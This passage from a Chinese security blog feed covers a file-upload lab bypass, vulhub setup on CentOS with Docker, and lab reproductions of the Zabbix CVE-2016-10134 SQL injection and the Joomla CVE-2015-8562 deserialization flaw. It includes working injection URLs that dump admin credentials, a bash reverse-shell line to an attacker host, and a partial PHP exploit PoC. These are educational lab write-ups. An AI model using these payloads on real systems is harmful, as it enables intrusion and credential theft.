class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME；修改Content-Type即可bypass</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;<span class="comment">#非数组则用explode(&#x27;.&#x27;, strtolower($file))分割为数组（以 . 分割）</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));<span class="comment">#即利用 . 将文件名和后缀分离，方便后续操作</span></span><br><span class="line">  <span class="comment">#explode() 返回由字符串组成的数组，每个元素都是string的一个子串，它们被字符串delimiter作为边界点分割出来 </span></span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);<span class="comment">#取文件后缀，即数组最后一个（end()函数）</span></span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);<span class="comment">#判断后缀是否为jpg|png|gif；</span></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="comment">#reset将数组指针指向数组第一个单元；count()获取file元素个数，count($file)-1即元素个数-1</span></span><br><span class="line">            <span class="comment">#即拼接 文件名(数组第一个单元) + . + 数组倒数第二个单元；</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此：</p><p>1.检查MIME：修改Content-Type即可bypass</p><p>2.检查后缀名：将文件名分割取末尾元素判断，因此文件最后一个后缀必须为<code>jpg | png | gif</code></p><p>3.重新拼接文件名：拼接 <code>文件名(数组第一个单元)</code> + <code>.</code> + <code>数组倒数第二个单元</code>；</p><p>若传入值为非数组则用<code>explode(&#39;.&#39;, strtolower($file))</code>分割为数组(以 . 分割)，为使数组值可控，需以数组形式传入</p><p>控制传入参数的数组值：<code>save_name[0]=info.php</code> ; <code>save_name[2]=gif</code>；（此处save_name[1]默认为空）</p><p>故最终拼接得到的文件名为:<code>save_name[0]=info.php</code> + <code>save_name[1]=null</code>即得<code>info.php </code>，实现绕过</p><h3 id="bypass-20"><a href="#bypass-20" class="headerlink" title="bypass"></a>bypass</h3><p>如下：抓包修改即可~</p><p><img src="https://i.loli.net/2021/02/13/JZBYD9wqtifINnT.png"></p><p>最终</p><p><img src="https://i.loli.net/2021/02/13/iKWd4Xn658behPG.png"></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>写了两天总算写完了~过年第一章！</p><p>新年快乐♥</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> web </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建vulhub(基于centos)</title>
      <link href="2021/02/07/%E6%90%AD%E5%BB%BAvulhub(%E5%9F%BA%E4%BA%8Ecentos)/"/>
      <url>2021/02/07/%E6%90%AD%E5%BB%BAvulhub(%E5%9F%BA%E4%BA%8Ecentos)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前有所了解vulhub，但因为一些原因没有深入了解。借助这次任务安装、复现一下漏洞~</p><p>使用了：华为云的vps（centos系统）、docker（使用docker的基本要求是linux内核在3.10以上，可用<code>uname -e</code>查看）</p><h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><p>安装过程参考自<a href="https://www.cnblogs.com/Lee-404/p/12763280.html">Centos安装docker+vulhub搭建</a></p><p>vulhub漏洞环境文档详情：<a href="https://vulhub.org/#/environments/">Vulhub - Docker-Compose file for vulnerability environment</a></p><h2 id="配置yum源"><a href="#配置yum源" class="headerlink" title="配置yum源"></a>配置yum源</h2><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　cd /etc/yum.repos.d</span><br><span class="line"></span><br><span class="line">　mkdir repos_bak　　#用来保存备份文件夹</span><br><span class="line"></span><br><span class="line">　mv *.repo repos_bak</span><br></pre></td></tr></table></figure><h3 id="添加新源"><a href="#添加新源" class="headerlink" title="添加新源"></a>添加新源</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　curl -O http://mirrors.aliyun.com/repo/Centos-7.repo#此处为阿里源</span><br><span class="line">　curl -O http://mirrors.aliyun.com/repo/epel-7.repo</span><br><span class="line">　curl -O http://mirrors.aliyun.com/repo/epel-testing.repo</span><br><span class="line">　</span><br><span class="line">　yum clean all &amp;&amp; yum makecache#重建源缓存　</span><br></pre></td></tr></table></figure><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><h3 id="确保yum的包为最新"><a href="#确保yum的包为最新" class="headerlink" title="确保yum的包为最新"></a>确保yum的包为最新</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update -y</span><br></pre></td></tr></table></figure><h3 id="安装基本驱动依赖"><a href="#安装基本驱动依赖" class="headerlink" title="安装基本驱动依赖"></a>安装基本驱动依赖</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y yum-untils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure><h3 id="使用阿里的docker源"><a href="#使用阿里的docker源" class="headerlink" title="使用阿里的docker源"></a>使用阿里的docker源</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo　</span><br><span class="line"></span><br><span class="line">yum makecache fast</span><br></pre></td></tr></table></figure><h3 id="安装docker-1"><a href="#安装docker-1" class="headerlink" title="安装docker"></a>安装docker</h3><p>安装默认版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install docker-ce</span><br></pre></td></tr></table></figure><p>指定版本安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum list docker-ce --showduplicates | sort -r　　#显示docker版本列表</span><br><span class="line"></span><br><span class="line">yum -y install 版本　　#如：yum -y install docker-ce-18.03.1.ce-1.el7.centos</span><br></pre></td></tr></table></figure><h3 id="验证docker是否安装成功以及开机自启"><a href="#验证docker是否安装成功以及开机自启" class="headerlink" title="验证docker是否安装成功以及开机自启"></a>验证docker是否安装成功以及开机自启</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker version#显示docker版本</span><br><span class="line"></span><br><span class="line">systemctl start docker#启动docker~</span><br><span class="line">systemctl enable docker#设置开机自启</span><br></pre></td></tr></table></figure><h3 id="设置国内源（加速镜像使用-）"><a href="#设置国内源（加速镜像使用-）" class="headerlink" title="设置国内源（加速镜像使用~）"></a>设置国内源（加速镜像使用~）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.conf  #如果没有就自己创建，然后输入如下内容</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> 　&quot;registry-mirrors&quot;: [</span><br><span class="line">           &quot;https://dockerhub.azk8s.cn&quot;,</span><br><span class="line">    　     &quot;https://reg-mirror.qiniu.com&quot;,</span><br><span class="line">    　　　　&quot;https://registry.docker-cn.com&quot;,</span><br><span class="line">    　　　　&quot;http://hub-mirror.c.163.com&quot;,</span><br><span class="line">   　　　　 &quot;https://3laho3y3.mirror.aliyuncs.com&quot;,</span><br><span class="line">   　　　　 &quot;http://f1361db2.m.daocloud.io&quot;,</span><br><span class="line">   　　　　 &quot;https://mirror.ccs.tencentyun.com&quot;</span><br><span class="line"> 　　　　     ]</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure><p>vim的小知识：</p><p>粘贴完后按一下右上角的<code>esc</code>，然后按<code>:</code>输入<code>wq</code>就可以保存并退出啦~，再加个<code>!</code>就是强制保存并退出啦</p><h3 id="重启docker："><a href="#重启docker：" class="headerlink" title="重启docker："></a>重启docker：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="安装docker-compose："><a href="#安装docker-compose：" class="headerlink" title="安装docker-compose："></a>安装docker-compose：</h3><p>安装前要安装docker噢，在centos安装指令如下，也就是将可执行文件下载到本地即可~~</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">chmod +x /usr/local/bin/docker-compose#添加执行权限！</span><br></pre></td></tr></table></figure><h2 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h2><blockquote><p>官方文档：</p><p>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><p>安装<code>docker</code>和<code>docker-compose</code>后即可开始使用vulhub：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">安装git，为了后续从github拉取vulhub</span></span><br><span class="line">yum -y install git </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入漏洞管理目录，在此之前可以mkdir一个~</span></span><br><span class="line">cd /</span><br><span class="line">mkdir mycve</span><br><span class="line">cd mycve</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git#拉取vulhub到目录mycve中</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译（可选）</span></span><br><span class="line">docker-compose build </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">进入想安装的漏洞环境目录，运行如下命令即可进行搭建</span> </span><br><span class="line">docker-compose up -d </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">查看服务的运行端口，加上vps的ip地址就能访问啦~</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">测试完毕之后，使用此命令即可结束服务，使环境变为初始状态。</span></span><br><span class="line">docker-compose down </span><br></pre></td></tr></table></figure><h3 id="关于漏洞环境搭建的一些补充"><a href="#关于漏洞环境搭建的一些补充" class="headerlink" title="关于漏洞环境搭建的一些补充"></a>关于漏洞环境搭建的一些补充</h3><p>vulhub集成了许多漏洞环境，如下</p><p><img src="https://i.loli.net/2021/02/13/Yqo4HjfZFnGBEPi.png" alt="vulhub集成的环境"></p><p>进入想要下载的环境~</p><p><img src="https://i.loli.net/2021/02/13/4pPbWUGdxfKIs7k.png"></p><p>再进入相应漏洞目录，运行如下命令即可进行搭建 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure><p>这里我安装了zabbix的CVE-2016-10134(SQL注入漏洞)</p><p>然后访问vps的ip:对应端口即可，如下~</p><p><img src="https://i.loli.net/2021/02/13/f325W7Ja8FOEejr.png"></p><p>复现完之后记得还原初始环境噢：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down </span><br></pre></td></tr></table></figure><p>删除整个环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure><blockquote><p>ps:kali-linux安装vulhub</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">apt-get update  ##顺便更新一下软件</span><br><span class="line">apt install docker.io  ##安装docker</span><br><span class="line">docker -v  ##查看docker版本</span><br><span class="line">systemctl start docker  ##开启docker,不执行这条也行，能看到版本就已经开启服务了</span><br><span class="line">docker ps -a  ##显示docker信息</span><br><span class="line">apt-get install python3-pip  ##安装pip，需要python3的环境</span><br><span class="line">pip3 -V  ##看看pip的版本</span><br><span class="line">pip3 install docker-compose  ##使用pip安装docker-compose</span><br><span class="line">docker-compose -v  ##看看docker-compose的版本</span><br><span class="line"></span><br><span class="line">mkdir /cve</span><br><span class="line">cd /cve</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git  ##下载靶场</span><br><span class="line"></span><br><span class="line">其余的启动和关闭靶场同上~</span><br></pre></td></tr></table></figure></blockquote><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>这里先随便复现两个过过瘾吧，后面再另作目录分组记录~</p><h2 id="zabbix-latest-php-SQL注入漏洞（CVE-2016-10134）"><a href="#zabbix-latest-php-SQL注入漏洞（CVE-2016-10134）" class="headerlink" title="zabbix latest.php SQL注入漏洞（CVE-2016-10134）"></a>zabbix latest.php SQL注入漏洞（CVE-2016-10134）</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>zabbix是一款服务器监控软件，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p><p>zabbix 2.2.x, 3.0.0-3.0.3版本存在SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统</p><p>Zabbix 的<code>latest.php中的toggle_ids[]</code>或<code>jsrpc.php中的profieldx2参数</code>存在sql注入，通过sql注入获取管理员账户密码，进入后台，进行getshell操作。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="latest-php中的toggle-ids"><a href="#latest-php中的toggle-ids" class="headerlink" title="latest.php中的toggle_ids[]"></a>latest.php中的toggle_ids[]</h4><p>需要靶机系统未关闭默认开启guest账户登陆，zabbix 默认账户Admin密码zabbix（弱口令尝试一波~）</p><p>使用username：guest，password为空的游客账户登陆</p><p><img src="https://i.loli.net/2021/02/13/f325W7Ja8FOEejr.png"></p><p>登录后，查看Cookie中的<code>zbx_sessionid</code>，复制后16位字符：</p><p><img src="https://i.loli.net/2021/02/13/xBVOFagXmtnzeru.png"></p><p>将这16个字符作为sid的，构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:8080&#x2F;latest.php?output&#x3D;ajax&amp;sid&#x3D;******************&amp;favobj&#x3D;toggle&amp;toggle_open_state&#x3D;1&amp;toggle_ids[]&#x3D;updatexml(0,concat(0xa,database(),0xa,user()),0)</span><br></pre></td></tr></table></figure><p>如下：</p><p><img src="https://i.loli.net/2021/02/13/8uvI9oCdWnzlmYO.png"></p><h4 id="jsrpc-php的profieldx2参数"><a href="#jsrpc-php的profieldx2参数" class="headerlink" title="jsrpc.php的profieldx2参数"></a>jsrpc.php的profieldx2参数</h4><p>也可以通过jsrpc.php触发，且无需登陆</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:8080&#x2F;jsrpc.php?type&#x3D;0&amp;mode&#x3D;1&amp;method&#x3D;screen.get&amp;profileIdx&#x3D;web.item.graph&amp;resourcetype&#x3D;17&amp;profileIdx2&#x3D;updatexml(0,concat(0xa,database(),0xa,user()),0)</span><br></pre></td></tr></table></figure><p>如下：</p><p><img src="https://i.loli.net/2021/02/13/HaBdrgTc81yhO5S.png"></p><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>然后就是常规的注入流程啦。拿到管理员账户密码~</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;yourip:8080&#x2F;jsrpc.php?type&#x3D;0&amp;mode&#x3D;1&amp;method&#x3D;screen.get&amp;profileIdx&#x3D;web.item.graph&amp;resourcetype&#x3D;17&amp;profileIdx2&#x3D;updatexml(0,concat(0x7e,substr((select group_concat(surname,0x2a,passwd) from users ),1)),0)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/YoTeb7l6DZ5qFnj.png"><br><img src="https://i.loli.net/2021/02/13/pALPrzy957bBg1x.png"></p><p>Administrator</p><p>5fce1b3e34b520afeffb37ce08c7cd66</p><p><img src="https://i.loli.net/2021/02/13/1mDdf2a5tz7LHEJ.png"></p><p>MD5解密即得密码zabbix</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">管理员账户：（不懂为啥，用户名是Admin，可能是环境问题？）</span><br><span class="line">Admin</span><br><span class="line">zabbix</span><br></pre></td></tr></table></figure><p>登入后如下图点击~在administration下的scripts添加命令</p><p><img src="https://i.loli.net/2021/02/13/lOjT4emRzKL6cqE.png"></p><p>写入反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/你的ip/你的端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/XpjChdwn92AJL76.png"></p><p>触发脚本，然后NC监听即可~</p><p><img src="https://i.loli.net/2021/02/13/Y9XRjwgMPTvnEHl.png"></p><h2 id="Joomla-3-4-5-反序列化漏洞（CVE-2015-8562）"><a href="#Joomla-3-4-5-反序列化漏洞（CVE-2015-8562）" class="headerlink" title="Joomla 3.4.5 反序列化漏洞（CVE-2015-8562）"></a>Joomla 3.4.5 反序列化漏洞（CVE-2015-8562）</h2><h3 id="安装过程-1"><a href="#安装过程-1" class="headerlink" title="安装过程"></a>安装过程</h3><p>老样子，只是在网页配置过程注意填入如下数据</p><p><img src="https://i.loli.net/2021/02/13/mLkDCOvWSzawQ8p.png"></p><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>本漏洞根源是PHP5.6.13前的版本在读取存储好的session时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入4字节的utf8数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><ul><li>Joomla 1.5.x, 2.x, and 3.x before 3.4.6</li><li>PHP 5.6 &lt; 5.6.13, PHP 5.5 &lt; 5.5.29 and PHP 5.4 &lt; 5.4.45</li></ul><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>1.在低版本的php中,反序列化函数unserialize做了欠缺的异常处理。即不能正确解析需要反序列化的字符串时，会查找字符串中的下一个标识符”|”,从此处分割，以标识符前段做段名，再次解析标识符后段的字符串，直到成功或返回空。(此漏洞修复版本为:4.5.45 5.5.29 5.6.13 7.x)</p><blockquote><p>在php5.6.13以前的版本里，php在获取session字符串以后，就开始查找第一个|，然后用这个|将字符串分割成『键名』和『键值』。<br>用unserialize解析键值，解析结果作为session。</p><p>但如果这个unserialize解析失败，就放弃这次解析。找到下一个|，再根据这个|将字符串分割成两部分，执行同样的操作，直到解析成功。</p></blockquote><p>2.mysql在低版本或未配置utf8mb4时处理4字节utf字符会从4字节处截断，即丢弃截断处后的字符。（在mysql 5.5.3以后 可以通过设置字段为utf8mb4来避免漏洞）</p><blockquote><p>在我们构造好的反序列化字符串后面，还有它原本的内容，必须要截断。而此处并不像SQL注入，还有注释符可用。</p><p>在插入数据库的时候利用<code>𝌆</code>（%F0%9D%8C%86）字符将utf-8的字段截断了。</p><p>这里我们用同样的方法，在session进入数据库的时候就截断后面的内容，避免对我们反序列化过程造成影响。</p></blockquote><p>3.joomla在对useragent处理时会将useragent作为一个session存入数据库，没有过滤引起php反序列漏洞的”|”符号。</p><blockquote><p>joomla对session的存储格式为：<code>键名 + | + 经serialize()序列化处理的值</code></p><p>此处漏洞主要利用joomla存储格式对 | 的处理不当，导致攻击者可以利用 | 伪造，使得 | 前都为name， | 后就作为我们要插入的序列化字符串，即可构成反序列化漏洞。</p></blockquote><p>这个joomla漏洞的核心内容就是：我们通过<code>𝌆</code>字符， 将原本的session截断了，结果因为长度不对所以第一次解析|失败，才轮到第二次解析传入的 | ，最后成功利用。</p><p>所以，构造session出错，是这个漏洞成立的核心。</p><p><strong>整个流程：</strong></p><p>第一次传包：</p><p>客户端User-Agent字符串-》joomla将User-Agent字符串存储为session-》合并到session表中，序列化，将含poc的字符串存入数据库<strong>（mysql截断漏洞）</strong></p><p>第二次传包：</p><p>客户端发起请求-》从数据库中读入数据库并反序列化session<strong>（php反序列化漏洞）</strong>-》执行poc，闭合函数</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>不带User-Agent头，先访问一次目标主页，记下服务端返回的Cookie：</p><p><img src="https://i.loli.net/2021/02/13/YvDAh5ro3GLyMQu.png"></p><p>vulhub文档滴poc：            （在线执行<a href="https://sandbox.onlinephpfunctions.com/code/17e7080841ccce12f6c6e0bb1de01b9e390510bd">PHP Sandbox, test PHP online, PHP tester (onlinephpfunctions.com)</a>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSimplepieFactory</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysql</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$sanitize</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cache_name_function</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$javascript</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$feed_url</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;feed_url = <span class="string">&quot;phpinfo();JFactory::getConfig();exit;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;javascript = <span class="number">9999</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache_name_function = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sanitize = <span class="keyword">new</span> JDatabaseDriverMysql();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysqli</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span 